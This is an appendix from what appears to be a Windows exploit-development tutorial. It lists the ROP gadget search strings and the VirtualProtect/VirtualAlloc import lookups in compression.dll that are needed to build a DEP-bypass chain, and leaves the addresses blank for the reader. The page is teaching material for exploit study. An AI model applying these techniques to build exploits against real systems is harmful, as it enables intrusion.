## Appendix A: Gadget Table (fill from YOUR build)

Run `rp-win-x86.exe -f compression.dll -r 5 > rop.txt`, then populate the
right column with the exact `findstr` search shown. Symbolic names match the
narrative and `exploit/exploit.py`.

| Symbol | Instruction (search string) | Your address |
|---|---|---|
| `G_STACKPTR` | `push esp ; push eax ; pop edi ; pop esi ; ret` | `0x________` |
| `G_POP_EAX` | `pop eax ; ret` | `0x________` |
| `G_POP_ECX` | `pop ecx ; ret` | `0x________` |
| `G_ADD_EAX_ECX` | `add eax, ecx ; ret` | `0x________` |
| `G_SUB_EAX_ECX` | `sub eax, ecx ; ret` | `0x________` |
| `G_NEG_EAX` | `neg eax ; ret` | `0x________` |
| `G_DEREF_EAX` | `mov eax, dword [eax] ; ret` | `0x________` |
| `G_MOV_EAX_ESI` | `mov eax, esi ; pop esi ; ret` | `0x________` |
| `G_PUSH_EAX_POP_ESI` | `push eax ; pop esi ; ret` | `0x________` |
| `G_STORE` | `mov dword [esi], eax ; ret` | `0x________` |
| `G_INC_ESI` | `inc esi ; ret` (or `inc esi ; add al, 2Bh ; ret`) | `0x________` |
| `G_XCHG_EAX_EBP` | `xchg eax, ebp ; ret` | `0x________` |
| `G_MOV_ESP_EBP` | `mov esp, ebp ; pop ebp ; ret` | `0x________` |
| `IAT_VIRTUALPROTECT` | `dps compression!_imp__VirtualProtect L1` | `0x________` |
| `IAT_VIRTUALALLOC` | `dps compression!_imp__VirtualAlloc L1` | `0x________` |

If a search returns nothing, widen it (`-r 6`), accept an uglier gadget with
harmless side effects, or synthesize the primitive from two simpler gadgets.
Record *why* you chose each one — that reasoning is the skill.

---

---

[← Previous](14-aslr-outlook.md) · [Index](00-index.md) · [Next →](B-annotated-chain.md)
